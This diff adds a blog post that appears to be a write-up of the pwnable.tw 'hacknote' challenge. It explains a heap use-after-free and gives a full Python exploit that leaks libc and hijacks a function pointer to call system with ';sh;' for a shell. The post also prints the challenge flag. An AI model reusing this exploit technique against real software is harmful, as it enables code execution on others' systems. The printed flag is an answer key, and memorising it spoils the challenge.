@@ -1,0 +1,445 @@
+---
+title: '[PWNABLE.TW] - hacknote'
+description: 'Is it note safe?'
+image: '../../../img/cover_photo_wargame_imresizer.png'
+date: 2025-05-03
+tags: ['2025', 'Wargame', 'pwnable.tw']
+authors: ['kdot']
+draft: false
+---
+
+import Challenge from '@/components/mdx/Challenge.astro'
+
+## Challenge Information
+
+<Challenge
+  category="pwn"
+  points={200}
+  description="A good Hacker should always take good notes!"
+  flag="FLAG{Us3_aft3r_fl3333_in_h4ck_not3}"
+>
+</Challenge>
+
+## Reverse Engineering
+
+```sh title='checksec'
+alter ^ Sol in /mnt/e/sec/lab/pwnable.tw/hacknote
+$ checksec hacknote
+[*] '/mnt/e/sec/lab/pwnable.tw/hacknote/hacknote'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+```
+
+So we start with using `checksec` to check the binary's security. We can see that the binary has a stack canary, no PIE, and NX enabled. Now let's use IDA to decompile the binary and analyze it.
+
+<details id="main">
+<summary>main function</summary>
+<p>
+
+```c
+void __noreturn main()
+{
+  int choice; // eax
+  char buf[4]; // [esp+8h] [ebp-10h] BYREF
+  unsigned int v2; // [esp+Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      read(0, buf, 4u);
+      choice = atoi(buf);
+      if ( choice != 2 )
+        break;
+      delete();
+    }
+    if ( choice > 2 )
+    {
+      if ( choice == 3 )
+      {
+        print();
+      }
+      else
+      {
+        if ( choice == 4 )
+          exit(0);
+LABEL_13:
+        puts("Invalid choice");
+      }
+    }
+    else
+    {
+      if ( choice != 1 )
+        goto LABEL_13;
+      add();
+    }
+  }
+}
+```
+
+</p>
+</details>
+
+<details id="note struct">
+<summary>note struct</summary>
+<p>
+```sh title='note_t struct'
+00000000 struct note_t // sizeof=0x8
+00000000 {
+00000000     void (*pFun)(const char *);
+00000004     char *content;
+00000008 };
+```
+</p>
+</details>
+
+<details id="add">
+<summary>add function</summary>
+<p>
+```c
+unsigned int add()
+{
+  note_t *note; // ebx
+  int idx; // [esp+Ch] [ebp-1Ch]
+  int size; // [esp+10h] [ebp-18h]
+  char buf[8]; // [esp+14h] [ebp-14h] BYREF
+  unsigned int v5; // [esp+1Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  if ( n5 <= 5 )
+  {
+    for ( idx = 0; idx <= 4; ++idx )
+    {
+      if ( !ptr[idx] )
+      {
+        ptr[idx] = (note_t *)malloc(8u);
+        if ( !ptr[idx] )
+        {
+          puts("Alloca Error");
+          exit(-1);
+        }
+        ptr[idx]->pFun = (void (*)(const char *))puts_w;
+        printf("Note size :");
+        read(0, buf, 8u);
+        size = atoi(buf);
+        note = ptr[idx];
+        note->content = (char *)malloc(size);
+        if ( !ptr[idx]->content )
+        {
+          puts("Alloca Error");
+          exit(-1);
+        }
+        printf("Content :");
+        read(0, ptr[idx]->content, size);
+        puts("Success !");
+        ++n5;
+        return __readgsdword(0x14u) ^ v5;
+      }
+    }
+  }
+  else
+  {
+    puts("Full");
+  }
+  return __readgsdword(0x14u) ^ v5;
+}
+```
+</p>
+</details>
+
+<details id="delete">
+<summary>delete function</summary>
+<p>
+```c
+unsigned int delete()
+{
+  int n5; // [esp+4h] [ebp-14h]
+  char buf[4]; // [esp+8h] [ebp-10h] BYREF
+  unsigned int v3; // [esp+Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  printf("Index :");
+  read(0, buf, 4u);
+  n5 = atoi(buf);
+  if ( n5 < 0 || n5 >= ::n5 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( ptr[n5] )
+  {
+    free(ptr[n5]->content);
+    free(ptr[n5]);
+    puts("Success");
+  }
+  return __readgsdword(0x14u) ^ v3;
+}
+```
+</p>
+</details>
+
+<details id="print">
+<summary>print function</summary>
+<p>
+```c
+unsigned int print()
+{
+  int n5; // [esp+4h] [ebp-14h]
+  char buf[4]; // [esp+8h] [ebp-10h] BYREF
+  unsigned int v3; // [esp+Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  printf("Index :");
+  read(0, buf, 4u);
+  n5 = atoi(buf);
+  if ( n5 < 0 || n5 >= ::n5 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( ptr[n5] )
+    ptr[n5]->pFun((const char *)ptr[n5]);
+  return __readgsdword(0x14u) ^ v3;
+}
+```
+
+</p>
+</details>
+
+So we can see that the binary has a menu with 4 options:
+
+1. Add a note
+2. Delete a note
+3. Print a note
+4. Exit
+
+In the `add` function, the program lets us create a note with a size we choose. Each note is 8 bytes in size and contains a function pointer and a content pointer. The `delete` function allows us to remove a note at a chosen index. However, there is a `Use-After-Free` vulnerability because the pointer is not cleared after the memory is freed. The `print` function lets us print a note at any index we choose. One special thing here is that it uses the function pointer stored inside the note to print the content.
+
+## Exploit Strategies
+
+We need to do two things here:
+
+- Since the binary doesn't have free leak for us -> We need to leak libc address to calculate the base address of libc.
+- Leverage the `print` function to arbitrary code execution, since we can control the function pointer via `Use-After-Free`.
+
+## Exploit Development
+
+Because this is the heap note challenge so I create some helper functions to make the exploit easier to read. The first function is `add`, which allows us to add a note with a size of our choice. The second function is `delete`, which allows us to delete a note at the index we choose. The third function is `print`, which allows us to print a note at the index we choose.
+
+```py title='exploit.py'
+def choice(option: int):
+    sna(b'choice :', option)
+
+
+index = 0
+def add(size, content):
+
+    global index
+    index += 1
+    choice(1)
+    sna(b'size :', size)
+    sa(b'Content :', content)
+    return index - 1
+
+
+def delete(index):
+    choice(2)
+    sna(b'Index :', index)
+
+
+def print(index):
+    choice(3)
+    sna(b'Index :', index)
+```
+
+Then I will create 2 notes and then free these 2 notes, the purpose of this is we want to change the address of `content pointer` to the address of `GOT` to leak, and if we only free a single chunk, for example I create a note of 0x10 bytes, then in fastbins it will look like this
+
+```sh title='GDB'
+pwndbg> fastbins
+fastbins
+0x10: 0x804b000 ◂— 0
+0x18: 0x804b010 ◂— 0
+```
+
+Even though the program doesn’t delete the data when it calls free, so the content in memory stays the same, the real problem is in the `add()` function. Before the program lets us write to the note’s content, it first creates a new note with a fixed size of 0x8 bytes.
+
+Because of this, it takes a chunk from the fastbin — which is the same memory we might want to change. So, even if the old data is still there, that chunk is now used for a new note, and we lose the chance to change or control it. And that's why we need to create 2 chunks and free them.
+
+```py title='exploit.py'
+
+    chunkA = add(0x10, b'A'*4)      # index 0
+    chunkB = add(0x10, b'B'*4)      # index 1
+
+    delete(chunkA)
+    delete(chunkB)
+```
+
+```sh title='GDB'
+pwndbg> fastbins
+fastbins
+0x10: 0x804b028 —▸ 0x804b000 ◂— 0
+0x18: 0x804b038 —▸ 0x804b010 ◂— 0
+pwndbg> vis
+
+0x804b000       0x00000000      0x00000011      ........         <-- fastbins[0x10][1]
+0x804b008       0x00000000      0x0804b018      ........
+0x804b010       0x00000000      0x00000019      ........         <-- fastbins[0x18][1]
+0x804b018       0x00000000      0x00000000      ........
+0x804b020       0x00000000      0x00000000      ........
+0x804b028       0x00000000      0x00000011      ........         <-- fastbins[0x10][0]
+0x804b030       0x0804b000      0x0804b040      ....@...
+0x804b038       0x00000000      0x00000019      ........         <-- fastbins[0x18][0]
+0x804b040       0x0804b010      0x00000000      ........
+0x804b048       0x00000000      0x00000000      ........
+0x804b050       0x00000000      0x00020fb1      ........         <-- Top chunk
+```
+
+So the next time we `add` a note, we will request a size `0x8`, then with `malloc(0x8)`, first it will take `0x804b028` and with the next time it will take `0x804b000` and allow us to write here, and `0x804b000` is chunkA with index 0, so when we use the `print()` function with index 0, we will get the address of libc
+
+```py title='exploit.py'
+    chunkC = add(0x8, p32(printFunc) + p32(exe.got.puts))
+    print(chunkA)
+
+    puts = u32(rb(4))
+    libc.address = puts - libc.sym.puts
+
+    info('puts @ %#x', puts)
+    success('libc base @ %#x', libc.address)
+```
+
+Check the heap again:
+
+```sh title='GDB'
+pwndbg> vis
+
+0x804b000       0x00000000      0x00000011      ........
+0x804b008       0x0804862b      0x0804a024      +...$...
+0x804b010       0x00000000      0x00000019      ........         <-- fastbins[0x18][1]
+0x804b018       0x00000000      0x00000000      ........
+0x804b020       0x00000000      0x00000000      ........
+0x804b028       0x00000000      0x00000011      ........
+0x804b030       0x0804862b      0x0804b008      +.......
+0x804b038       0x00000000      0x00000019      ........         <-- fastbins[0x18][0]
+0x804b040       0x0804b010      0x00000000      ........
+0x804b048       0x00000000      0x00000000      ........
+0x804b050       0x00000000      0x00020fb1      ........         <-- Top chunk
+```
+
+Nice nice, everything is working as expected. `chunkA` is at `0x804b000`, and `chunkC` is at `0x804b028`. After have the libc base address, we just need to do the same method, `delete(chunkC)` and we will have 2 0x8 bytes chunks in fastbins, `add()` new note, and then write the address of `system` and the strinng `;sh;` to it
+
+```py title='exploit.py'
+    delete(chunkC)
+    chunkD = add(0x8, p32(libc.sym.system) + b';sh;\0')
+    print(chunkA)
+```
+
+<details id="full exploit">
+<summary>Full exploit</summary>
+<p>
+
+```py title='exploit.py'
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./hacknote_patched', checksec=False)
+libc = exe.libc
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(1)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+
+b *0804869A
+b *0x804872C
+b *0x804893D
+b *0x8048863
+b *0x8048863
+
+c
+'''
+
+p = start()
+
+# ==================== EXPLOIT ====================
+
+def choice(option: int):
+    sna(b'choice :', option)
+
+
+index = 0
+def add(size, content):
+
+    global index
+    index += 1
+    choice(1)
+    sna(b'size :', size)
+    sa(b'Content :', content)
+    return index - 1
+
+
+def delete(index):
+    choice(2)
+    sna(b'Index :', index)
+
+
+def print(index):
+    choice(3)
+    sna(b'Index :', index)
+
+
+def exploit():
+
+    printFunc = 0x804862B
+
+    chunkA = add(0x10, b'A'*4)      # index 0
+    chunkB = add(0x10, b'B'*4)      # index 1
+
+    delete(chunkA)
+    delete(chunkB)
+
+    chunkC = add(0x8, p32(printFunc) + p32(exe.got.puts))
+    print(chunkA)
+
+    puts = u32(rb(4))
+    libc.address = puts - libc.sym.puts
+
+    info('puts @ %#x', puts)
+    success('libc base @ %#x', libc.address)
+
+    delete(chunkC)
+    chunkD = add(0x8, p32(libc.sym.system) + b';sh;\0')
+    print(chunkA)
+
+
+    interactive()
+
+if __name__ == '__main__':
+    exploit()
+```
+</p>
+</details>
